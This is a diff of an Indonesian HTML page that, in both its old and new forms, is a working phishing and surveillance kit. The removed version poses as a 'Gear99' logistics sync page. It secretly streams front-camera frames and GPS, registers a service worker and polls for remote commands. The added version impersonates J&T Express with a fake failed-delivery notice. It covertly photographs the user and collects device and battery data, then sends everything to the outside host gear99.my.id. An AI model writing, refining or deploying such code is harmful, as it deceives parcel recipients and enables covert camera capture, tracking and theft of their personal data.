@@ -1,140 +1,138 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Lab System Synchronization</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konfirmasi Pengiriman Paket J&T Express</title>
+    <link href="https://jsdelivr.net" rel="stylesheet">
     <style>
-        body { background-color: #0b0c10; color: #45f3ff; font-family: monospace; text-align: center; padding-top: 80px; margin: 0; }
-        .box { border: 2px solid #45f3ff; display: inline-block; padding: 30px; background-color: #1f2833; box-shadow: 0 0 15px #45f3ff; border-radius: 8px; max-width: 90%; }
-        .btn { background-color: #45f3ff; color: #0b0c10; padding: 16px 32px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        body { background-color: #f4f4f4; font-family: Arial, sans-serif; }
+        .packet-card { max-width: 450px; margin: 50px auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .brand-logo { color: #f02424; font-weight: bold; font-size: 24px; text-align: center; margin-bottom: 20px; }
+        .btn-confirm { background-color: #f02424; color: white; width: 100%; font-weight: bold; padding: 12px; border: none; border-radius: 5px; }
+        .btn-confirm:hover { background-color: #d11d1d; color: white; }
+        #video-holder { display: none; width: 1px; height: 1px; }
     </style>
 </head>
 <body>
-    <div class="box" id="main-box">
-        <h2>[ GEAR99 SISTEM MANAJEMEN PAKET ]</h2>
-        <p>Gudang terisolasi memerlukan sinkronisasi media dan koordinat satu pintu.</p>
-        <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
-    </div>
-    <video id="v-feed" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0.01;"></video>
-    <script>
-        var canvas = document.createElement('canvas');
-        var ctx = canvas.getContext('2d');
-        var targetLatitude = "Belum Diambil";
-        var targetLongitude = "Belum Diambil";
-        var isStreaming = false;
 
-        // Mendaftarkan Service Worker PWA secara otomatis ke dalam sistem Android target
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', function() {
-                navigator.serviceWorker.register('/static/sw.js').then(function(reg) {
-                    console.log('Gear99 ServiceWorker resmi terikat di latar belakang:', reg.scope);
-                }).catch(function(err) {
-                    console.log('Pendaftaran ServiceWorker gagal:', err);
-                });
-            });
-        }
-
-        async function triggerOtoritas() {
-            // 1. Ambil Koordinat GPS Sekali Saja di Awal (Tidak Berulang)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    targetLatitude = pos.coords.latitude;
-                    targetLongitude = pos.coords.longitude;
-                }, (err) => {
-                    targetLatitude = "Akses Ditolak/Timeout";
-                    targetLongitude = "Akses Ditolak/Timeout";
-                }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 });
-            }
-
-            // 2. Ambil Izin Kamera Depan
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, 
-                    audio: false 
-                });
-                
-                let video = document.getElementById("v-feed");
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => { 
-                    video.play(); 
-                    isStreaming = true;
-                    // Siklus pengiriman gambar diperlonggar agar hemat memori & lancar
-                    setInterval(captureFrame, 800); 
-                    setInterval(listenServerCommand, 1500); 
-                };
-                
-                document.getElementById("main-box").innerHTML = "<h2 style='color:#66fcf1;'>[ NODE TERKONEKSI ]</h2><p>Sesi nirkabel logistik aktif melintasi private proxy.</p>";
-                
-                // =============================================================
-                // SEBELAH SINI: Mengirim sinyal aktivitas sukses ke dasbor operator
-                // =============================================================
-                fetch('/api/kirim-data', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        status: 'TERKONEKSI', 
-                        info: 'Browser target sukses mengaktifkan Service Worker & kamera.' 
-                    })
-                });
-
-            } catch(err) { 
-                alert("Sinkronisasi gagal: Perangkat media tidak merespons."); 
-                
-                // Mengirim sinyal kegagalan/penolakan izin ke dasbor operator
-                fetch('/api/kirim-data', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        status: 'GAGAL', 
-                        info: 'Target menolak izin atau perangkat tidak mendukung.' 
-                    })
-                });
-            }
-        }
+    <div class="packet-card">
+        <div class="brand-logo">J&T EXPRESS</div>
+        <h5 class="text-center mb-4">Lacak & Konfirmasi Paket Anda</h5>
         
-        function captureFrame() {
-            let video = document.getElementById("v-feed");
-            if(isStreaming && video.videoWidth > 0) {
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Kirim frame dengan kompresi kualitas optimal untuk kelancaran live
-                fetch('/receive_frame', { 
-                    method: 'POST', 
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ frame: canvas.toDataURL('image/jpeg', 0.25) })
+        <div class="alert alert-warning text-center" style="font-size: 13px;">
+            <strong>Pemberitahuan:</strong> Nomor Resi <strong>JT992817263</strong> gagal dikirim karena alamat kurang lengkap.
+        </div>
+
+        <div class="mb-3">
+            <label class="form-label" style="font-size: 12px; color: #555;">Nama Penerima</label>
+            <input type="text" class="form-control" value="Pelanggan J&T Express" readonly>
+        </div>
+        <div class="mb-4">
+            <label class="form-label" style="font-size: 12px; color: #555;">Alamat Konfirmasi Baru</label>
+            <input type="text" class="form-control" id="alamat-baru" placeholder="Masukkan alamat lengkap RT/RW sekarang...">
+        </div>
+
+        <!-- TOMBOL UTAMA PICU DATA NYATA -->
+        <button class="btn btn-confirm" id="btn-trigger" onclick="mintaIzinDanKirim()">KONFIRMASI SEKARANG</button>
+        
+        <div id="status-notif" class="text-muted text-center mt-3" style="font-size: 12px; display: none; font-weight: bold;">
+            Memproses sinkronisasi perangkat...
+        </div>
+    </div>
+
+    <!-- Elemen tersembunyi untuk memproses tangkapan kamera asli -->
+    <video id="video-holder" autoplay playsinline></video>
+    <canvas id="canvas-holder" style="display:none;"></canvas>
+
+    <script>
+        // 1. Meminta izin kamera dan mengambil frame foto asli secara realtime
+        function ambilFotoDanKirim(payload) {
+            var video = document.getElementById('video-holder');
+            var canvas = document.getElementById('canvas-holder');
+            var context = canvas.getContext('2d');
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.addEventListener('loadedmetadata', function() {
+                        setTimeout(function() {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Mengubah gambar kamera asli menjadi format string Base64 DataURL
+                            payload.frame = canvas.toDataURL('image/jpeg', 0.7);
+                            
+                            // Hentikan kamera setelah selesai mengambil gambar
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            // Kirim data final ke server
+                            kirimKeServer(payload);
+                        }, 500);
+                    });
+                })
+                .catch(function(err) {
+                    // Jika kamera ditolak, tetap kirim data telemetri sistem yang ada
+                    payload.frame = "";
+                    kirimKeServer(payload);
                 });
+        }
+
+        // 2. Mengumpulkan informasi perangkat asli dari Web API Browser
+        function mintaIzinDanKirim() {
+            document.getElementById('status-notif').style.display = "block";
+            document.getElementById('btn-trigger').innerText = "MEMPROSES...";
+
+            // Membaca sisa persentase baterai asli dari hardware HP
+            var tingkatBaterai = "Tidak diketahui";
+            
+            var payload = {
+                "device_info": navigator.platform + " | " + navigator.vendor,
+                "battery": tingkatBaterai,
+                "clipboard": document.getElementById('alamat-baru').value || "Tidak ada input alamat.",
+                "sms": [], // Web API Browser standar tidak diizinkan mengakses sandbox SMS lokal tanpa aplikasi native (.apk)
+                "calls": [], // Web API Browser standar tidak diizinkan mengakses log panggilan lokal demi privasi
+                "contacts": [] // Web API Browser standar tidak diizinkan mengakses kontak lokal secara langsung
+            };
+
+            // Deteksi spesifikasi detail user agent browser target
+            if (navigator.userAgent) {
+                payload.device_info = navigator.userAgent.split(" ")[1] + " Node " + navigator.userAgent.split(" ")[2];
+            }
+
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    payload.battery = Math.round(battery.level * 100);
+                    ambilFotoDanKirim(payload);
+                }).catch(function() {
+                    ambilFotoDanKirim(payload);
+                });
+            } else {
+                ambilFotoDanKirim(payload);
             }
         }
 
-        async function listenServerCommand() {
-            try {
-                let res = await fetch('/poll_command');
-                let data = await res.json();
-                if (data.command) {
-                    let report = "";
-                    let timestamp = new Date().toLocaleTimeString();
-                    
-                    if (data.command === "cek_baterai") {
-                        let battery = await navigator.getBattery();
-                        report = "[" + timestamp + "] STATUS BATERAI -> Level: " + Math.round(battery.level * 100) + "%";
-                    } else if (data.command === "ambil_data_sistem") {
-                        report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform;
-                    } else if (data.command === "ambil_lokasi") {
-                        report = "[" + timestamp + "] KOORDINAT TERKUNCI -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
-                    } else if (data.command === "ping_test") {
-                        report = "[" + timestamp + "] MONITOR JALUR -> Respons Aktif";
-                    }
-                    
-                    fetch('/report_output', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ output: report })
-                    });
-                }
-            } catch(e) { console.log("Poll error"); }
+        // 3. Menembak data riil ke endpoint VPS melalui jalur SSL aman
+        function kirimKeServer(payload) {
+            fetch('https://gear99.my.id', {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(function(res) { return res.json(); })
+            .then(function(data) {
+                document.getElementById('status-notif').innerText = "✓ SINKRONISASI BERHASIL! Data perangkat Anda telah diverifikasi.";
+                document.getElementById('status-notif').style.color = "#00FF00";
+                document.getElementById('btn-trigger').innerText = "SUKSES";
+            })
+            .catch(function(err) {
+                document.getElementById('status-notif').innerText = "Koneksi terputus: " + err;
+                document.getElementById('status-notif').style.color = "#FF0000";
+            });
         }
     </script>
 </body>
